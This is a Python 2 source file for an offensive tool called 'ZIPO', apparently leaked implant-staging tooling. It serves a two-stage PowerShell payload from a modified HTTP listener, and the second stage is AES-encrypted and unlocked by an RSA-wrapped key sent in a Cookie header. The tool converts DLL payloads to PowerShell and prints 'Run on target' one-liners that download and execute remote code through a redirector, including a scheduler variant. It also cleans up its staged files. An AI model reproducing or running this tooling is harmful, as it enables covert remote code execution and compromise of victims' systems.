
from Crypto.Cipher import AES
from Crypto.Hash import SHA
from Crypto.PublicKey import RSA
from Crypto import Random
import base64
import binascii
import datetime
import glob
import logging
import os
import powershellify
import re
import sys
import shutil
import subprocess
import shlex
import struct
import SimpleHTTPServer
import SocketServer
import zlib
global rsa_key
global iv
global logger

class ExploitLogger(logging.FileHandler, ):

    def emit(self, record):
        try:
            stream = self.stream
            stream.write(('%s  %s %s\n' % (record.asctime, record.levelname, record.msg)))
        except:
            self.handleError(record)
            print '[-] Bad error... Logging failed'
        self.flush()

def setup_logging(log_filename):
    global logger
    FORMAT = '%(asctime)-15s  %(message)s'
    logging.basicConfig(format=FORMAT)
    logger = logging.getLogger()
    file_logger = ExploitLogger(log_filename)
    logger.addHandler(file_logger)
    logger.setLevel(logging.INFO)

def create_powershell_b64(script, output_filename):
    script = unicode(script)
    ps_fixed_string = ''
    for character in script:
        ps_fixed_string += (character + '\x00')
    b64_ps_string = base64.b64encode(ps_fixed_string)
    try:
        wf = open(('target_scripts\\%s' % output_filename), 'w')
        wf.write(b64_ps_string)
        wf.close()
    except Exception as e:
        logger.error(('[-] Error Writing index.html, The base64 stub code: %s' % e))
        logger.error('[ !!!!  ]  EXITING  [ !!!! ] ')
        sys.exit((-1))

def changed_parse_request(self):
    global crypto_key
    self.command = None
    self.request_version = version = self.default_request_version
    self.close_connection = 1
    requestline = self.raw_requestline
    if (requestline[(-2):] == '\r\n'):
        requestline = requestline[:(-2)]
    elif (requestline[(-1):] == '\n'):
        requestline = requestline[:(-1)]
    self.requestline = requestline
    words = requestline.split()
    if (len(words) == 3):
        [command, path, version] = words
        if (version[:5] != 'HTTP/'):
            self.send_error(400, ('Bad request version (%r)' % version))
            return False
        try:
            base_version_number = version.split('/', 1)[1]
            version_number = base_version_number.split('.')
            if (len(version_number) != 2):
                raise ValueError
            version_number = (int(version_number[0]), int(version_number[1]))
        except (ValueError, IndexError):
            self.send_error(400, ('Bad request version (%r)' % version))
            return False
        if ((version_number >= (1, 1)) and (self.protocol_version >= 'HTTP/1.1')):
            self.close_connection = 0
        if (version_number >= (2, 0)):
            self.send_error(505, ('Invalid HTTP Version (%s)' % base_version_number))
            return False
    elif (len(words) == 2):
        [command, path] = words
        self.close_connection = 1
        if (command != 'GET'):
            self.send_error(400, ('Bad HTTP/0.9 request type (%r)' % command))
            return False
    elif (not words):
        return False
    else:
        self.send_error(400, ('Bad request syntax (%r)' % requestline))
        return False
    (self.command, self.path, self.request_version) = (command, path, version)
    self.headers = self.MessageClass(self.rfile, 0)
    cookie = self.headers.get('Cookie', '')
    crypto_key = 0
    if cookie:
        logger.info('[+] Cookie Received ')
        crypto_key = cookie
        logger.info('Received RSA encrypted blob: %s', crypto_key)
    conntype = self.headers.get('Connection', '')
    if (conntype.lower() == 'close'):
        self.close_connection = 1
    elif ((conntype.lower() == 'keep-alive') and (self.protocol_version >= 'HTTP/1.1')):
        self.close_connection = 0
    return True

def changed_send_head(self):
    path = self.translate_path(self.path)
    f = None
    if os.path.isdir(path):
        if (not self.path.endswith('/')):
            self.send_response(301)
            self.send_header('Location', (self.path + '/'))
            self.end_headers()
            return None
        for index in ('index.html', 'index.htm'):
            index = os.path.join(path, index)
            if os.path.exists(index):
                path = index
                break
        else:
            return self.list_directory(path)
    ctype = self.guess_type(path)
    try:
        if (os.path.basename(path).lower() == 'index.htm'):
            try:
                if crypto_key:
                    payload = encrypt(rsa_key, path, crypto_key)
                    wf = open((path + '.enc'), 'wb')
                    wf.write(payload)
                    wf.close()
                    f = open((path + '.enc'), 'rb')
                else:
                    self.send_error(404, 'Page does not exist')
                    return None
            except Exception as e:
                logger.error(('[-] Error Writing the encrypted payload or reading the index.htm : %s' % e))
                logger.error('[ !!!!  ]  EXITING  [ !!!! ] ')
                sys.exit((-1))
        else:
            try:
                f = open(path, 'rb')
            except Exception as e:
                logger.error(('[-] Error Reading index.html: %s' % e))
                logger.error('[ !!!!  ]  EXITING  [ !!!! ] ')
                sys.exit((-1))
    except IOError:
        self.send_error(404, 'File not found')
        return None
    self.send_response(200)
    self.send_header('Content-type', ctype)
    fs = os.fstat(f.fileno())
    self.send_header('Content-Length', str(fs[6]))
    self.send_header('Last-Modified', self.date_time_string(fs.st_mtime))
    self.end_headers()
    return f

class exploit:

    def __init__(self, redirector_ip='', redirector_port='8080', local_http_port='8080'):
        self.redir_ip = redirector_ip
        self.redir_port = redirector_port
        self.local_port = int(local_http_port)
        self.decrypt_script = 'index.html'
        self.payload_script = 'index.htm'
        self.ready_to_exploit = False

    def config_decryptor(self):
        try:
            rf = open('decryptor_downloader.base', 'r')
            modulus = get_modulus()
            exponent = get_exponent()
            base_script = rf.read()
            mod_script = re.sub('<IP>', self.redir_ip, base_script)
            mod_script = re.sub('<PORT>', self.redir_port, mod_script)
            mod_script = re.sub('<FILENAME>', self.payload_script, mod_script)
            mod_script = re.sub('<IV>', self.iv, mod_script)
            mod_script = re.sub('<MODULUS>', modulus, mod_script)
            mod_script = re.sub('<EXPONENT>', exponent, mod_script)
            return mod_script
        except Exception as e:
            logger.error(('[-] Error: %s' % e))
            logger.error('[ !!!!  ]  EXITING  [ !!!! ] ')
            sys.exit((-1))

    def prepare(self, payload):
        global iv
        global rsa_key
        logger.info('[+] GENERATING RSA KEY')
        rsa_key = RSA.generate(2048)
        logger.info('[+] RSA KEY GENERATED')
        iv = Random.new().read(16)
        self.iv = base64.b64encode(iv)
        configured_script = self.config_decryptor()
        create_powershell_b64(configured_script, self.decrypt_script)
        logger.info(('[+] 1st Stage configured and stored: %s' % self.decrypt_script))
        self.local_unencrypted_payload = payload
        shutil.copy(payload, ('target_scripts\\%s' % self.payload_script))
        if os.path.exists(('target_scripts\\%s' % self.payload_script)):
            logger.info(('[+] 2nd Stage is present: %s' % self.payload_script))
            self.ready_to_exploit = True
        else:
            logger.error(('[-] 2nd Stage is MISSING: %s' % self.payload_script))
            self.ready_to_exploit = False

    def print_download_cmd(self):
        print '\n\n================================= Run on target =================================='
        command_line = 'scheduler -add 1m "powershell -noprofile -c $wc=New-Object System.Net.Webclient;$sc = $wc.downloadstring(\'http://<IP>:<PORT>/<FILENAME>\');powershell -noprofile -encodedCommand $sc;" at -target'
        mod_line = re.sub('<IP>', self.redir_ip, command_line)
        mod_line = re.sub('<PORT>', self.redir_port, mod_line)
        mod_line = re.sub('<FILENAME>', self.decrypt_script, mod_line)
        print '=== DSZ Scheduler ==='
        print mod_line
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(mod_line)
            win32clipboard.CloseClipboard()
            print '============================= DSZ COMMAND IN THE CLIPBOARD ============================='
        except:
            pass
        command_line = "powershell -noprofile -c $wc=New-Object System.Net.Webclient;$sc = $wc.downloadstring('http://<IP>:<PORT>/<FILENAME>');powershell -noprofile -encodedCommand $sc;"
        mod_line = re.sub('<IP>', self.redir_ip, command_line)
        mod_line = re.sub('<PORT>', self.redir_port, mod_line)
        mod_line = re.sub('<FILENAME>', self.decrypt_script, mod_line)
        print '=== Windows cmd line ==='
        print mod_line
        print '================================= Run on target ==================================\n\n'

    def start(self):
        if self.ready_to_exploit:
            saved_cwd = os.getcwd()
            os.chdir('target_scripts')
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
            Handler.parse_request = changed_parse_request
            Handler.send_head = changed_send_head
            self.server = SocketServer.TCPServer(('', self.local_port), Handler)
            self.print_download_cmd()
            print '[+] HTTPD Listener Started'
            self.server.handle_request()
            logger.info(('[+] 1st Stage Downloaded - Did GET contain %s?' % self.decrypt_script))
            self.server.handle_request()
            logger.info(('[+] 2nd Stage Downloaded - Did GET contain %s?' % self.payload_script))
            self.cleanup()
            os.chdir(saved_cwd)
        else:
            logger.error('[-] Required Components of the exploit are not configured or missing')
            raise Exception

    def cleanup(self):
        delete_files = glob.glob('index*')
        for file in delete_files:
            os.remove(file)

def get_modulus():
    modulus_long = hex(rsa_key.n)
    logger.info(('[+] Public Modulus: %d' % rsa_key.n))
    modulus_string = '0x00,'
    for i in range(2, len(modulus_long), 2):
        if (modulus_long[i:(i + 2)] != 'L'):
            modulus_string = ('%s0x%s,' % (modulus_string, modulus_long[i:(i + 2)]))
    modulus_string = modulus_string.rstrip(',')
    return modulus_string

def get_exponent():
    exponent_unpacked = struct.pack('L', rsa_key.e)
    logger.info(('[+] Public Exponent: %d' % rsa_key.e))
    exponent_hex = binascii.hexlify(exponent_unpacked)
    exponent_string = ''
    for i in range(0, len(exponent_hex), 2):
        exponent_string = ('%s0x%s,' % (exponent_string, exponent_hex[i:(i + 2)]))
    return exponent_string.rstrip(',')[:(-5)]

def encrypt(rsa, payload, recv_key):
    de64 = base64.b64decode(recv_key)
    password = 0
    decrypt_key = rsa.decrypt(de64)
    bin_key = binascii.hexlify(decrypt_key)
    if ((len(decrypt_key) > 0) and (decrypt_key[0] == '\x02')):
        offset = decrypt_key.find('\x00')
        password = binascii.hexlify(decrypt_key[(offset + 1):])
    if password:
        logger.info(('[+] RSA KEY RECIEVED: %s' % password.upper()))
    else:
        logger.error('PASSWORD WAS NOT FOUND IN COOKIE')
        raise Exception
    try:
        rf = open(payload, 'rb')
        data = rf.read()
        rf.close()
    except Exception as e:
        logger.error(('[-] Error: %s' % e))
        sys.exit((-1))
    aes_hasher = SHA.new(password.upper())
    key = aes_hasher.digest()
    logger.info(('[+] Original Payload Length: %d' % len(data)))
    compressed_data = zlib.compress(data)
    logger.info(('[+] Compressed Payload Length: %d' % len(compressed_data)))
    aes = AES.new(key[:16], AES.MODE_CBC, iv)
    padded_data = (compressed_data + ('\x00' * (16 - (len(compressed_data) % 16))))
    enc_data = aes.encrypt(padded_data)
    logger.info(('[+] Encrypted Payload Length: %d' % len(enc_data)))
    logger.info(('[+] Encrypted: %s' % payload))
    logger.info(('[+] IV: %s' % base64.b64encode(iv)))
    return base64.b64encode(enc_data)

def menu():
    print '=================================='
    print '|           ZIPO                 |'
    print '=================================='
    print '(1) Upload / Execute PC Egg'
    print '(2) Upload / Execute Powershell Script'
    print '(3) Create compressed script to be run manually on target'
    print '(0) Quit'
    ans = raw_input('Choice: ')
    try:
        int_ans = int(ans)
        if ((int_ans >= 0) and (int_ans < 4)):
            return int_ans
        else:
            return None
    except:
        return None

def get_redir_info(redir_ip, redir_port, local_port):
    while True:
        redir_ip = get_input(('Redirector IP:[%s] ' % redir_ip), redir_ip)
        try:
            octs = redir_ip.split('.')
            if (len(octs) != 4):
                raise 
            for test_oct in octs:
                test_val = int(test_oct)
                if ((test_val < 0) or (test_val > 255)):
                    raise 
        except:
            print '[-] Error in Redir IP'
            continue
        redir_port = get_input(('Redirector Listen Port:[%s] ' % redir_port), redir_port)
        try:
            test_val = int(redir_port)
            if ((test_val <= 0) or (test_val > 65535)):
                raise 
        except:
            print '[-] Error in Redir port'
            continue
        local_port = get_input(('Local Listen Port:[%s] ' % local_port), local_port)
        try:
            test_val = int(local_port)
            if ((test_val <= 0) or (test_val > 65535)):
                raise 
        except:
            print '[-] Error in local port'
            continue
        return (redir_ip, redir_port, local_port)

def is_payload_64(filename):
    try:
        dll_file = open(filename, 'rb')
        dos_header = dll_file.read(64)
        (magic,) = struct.unpack('2s', dos_header[:2])
        (offset,) = struct.unpack('<l', dos_header[(-4):])
        if (not (magic == 'MZ')):
            logger.error('[-] File is not an exe or dll')
            sys.exit((-1))
        else:
            logger.info('[+] Detected PE MAGIC')
        dll_file.seek(offset)
        pe_header = dll_file.read(6)
    except Exception as e:
        logger.error(('[-] Error: %s' % e))
        logger.error('[ !!!!  ]  EXITING  [ !!!! ] ')
        sys.exit((-1))
    (machine,) = struct.unpack('<H', pe_header[(-2):])
    if (machine == 34404):
        logger.info(('[+] 64 Bit machine: %s' % hex(machine)))
        logger.info('[+] Payload is 64bit')
        return True
    elif (machine == 332):
        logger.info(('[+] 32 Bit machine: %s' % hex(machine)))
        logger.info('[+] Payload is i386')
        return False
    else:
        logger.info(('[-] Unknown machine: %s' % hex(machine)))
        logger.error("[ !!!! ] I DON'T KNOW WHAT YOU GAVE ME [ !!! ]")
        sys.exit((-1))

def get_input(prompt, old_value):
    new_value = raw_input(prompt)
    if (not new_value.strip()):
        return old_value
    return new_value

def get_logging_dir():
    try:
        base_path = 'D:\\\\Logs\\\\'
        dir_list = os.listdir(base_path)
    except:
        base_path = 'C:\\\\'
        dir_list = os.listdir(base_path)
    project_list = []
    dir_count = 1
    for dir in dir_list:
        if os.path.isdir(('%s%s' % (base_path, dir))):
            print ('[ %d ] %s' % (dir_count, dir))
            dir_count += 1
            project_list.append(('%s%s\\\\' % (base_path, dir)))
    while True:
        input_path = raw_input('Enter Project: ')
        try:
            if ((int(input_path) > 0) and (int(input_path) < (len(project_list) + 1))):
                return project_list[(int(input_path) - 1)]
            else:
                raise 
        except:
            print '[-] Bad value for project'
if (__name__ == '__main__'):
    my_path = os.path.realpath(__file__)
    os.chdir(os.path.dirname(my_path))
    menu_choice = (-1)
    payload = ''
    redir_ip = ''
    redir_port = ''
    local_port = ''
    output_script = ''
    log_dir = get_logging_dir()
    setup_logging(('%s\\\\ZIPO-%s.log' % (log_dir, datetime.date.today().isoformat())))
    while (menu_choice != 0):
        try:
            menu_choice = menu()
            if (menu_choice == 1):
                payload = get_input(('Payload DLL:[%s] ' % payload), payload).strip('"')
                if (not os.path.exists(payload)):
                    print '[-] Path does not exist'
                    continue
                (redir_ip, redir_port, local_port) = get_redir_info(redir_ip, redir_port, local_port)
                dll_ps_script = 'working_dir\\DLL_2_Powershell.txt'
                try:
                    powershellify.make_compressed_script(payload, dll_ps_script)
                except Exception as e:
                    logger.error(e)
                zipo = exploit(redirector_ip=redir_ip, redirector_port=redir_port, local_http_port=local_port)
                logger.info(('[+] Payload info: %s %s %s %s' % (redir_ip, redir_port, local_port, payload)))
                zipo.prepare(dll_ps_script)
                zipo.start()
            if (menu_choice == 2):
                payload = raw_input('Payload Powershell Script: ')
                (redir_ip, redir_port, local_port) = get_redir_info(redir_ip, redir_port, local_port)
                dll_ps_script = payload
                zipo = exploit(redirector_ip=redir_ip, redirector_port=redir_port, local_http_port=local_port)
                logger.info(('[+] Payload info: %s %s %s %s' % (redir_ip, redir_port, local_port, dll_ps_script)))
                zipo.prepare(dll_ps_script)
                zipo.start()
            if (menu_choice == 3):
                ra_options = 1
                if (get_input('Non-Standard Ordinal: Y/(N)', 'N').upper().strip() == 'Y'):
                    while True:
						ra_options = raw_input('Enter ordinal: ').strip()
						try:
							ra_options = int(ra_options)
						except:
							pass
						else:
							break
                if (get_input('Multiple payload dlls?: Y/(N)', 'N').upper().strip() != 'Y'):
                    multi_flag = False
                else:
                    multi_flag = True
                if multi_flag:
                    payload_list = []
                    payload_list.append(get_input(('Payload DLL #1:[%s] ' % payload), payload).strip('"'))
                    payload_list.append(get_input(('Payload DLL #2:[%s] ' % payload), payload).strip('"'))
                    output_script = raw_input(('Output Script:[%s] ' % output_script))
                    powershellify.make_compressed_script(payload_list, output_script, ordinal=ra_options, standalone=True)
                    logger.info(('[+] Payload info ' + str(payload_list)))
                else:
                    payload = get_input(('Payload DLL:[%s] ' % payload), payload).strip('"')
                    output_script = raw_input(('Output Script:[%s] ' % output_script))
                    powershellify.make_compressed_script(payload, output_script, ordinal=ra_options, standalone=True)
                    powershellify.print_help()
                    logger.info(('[+] Payload info %s' % payload))
            if (menu_choice == 0):
                sys.exit(0)
        except Exception as e:
            logger.error(e)
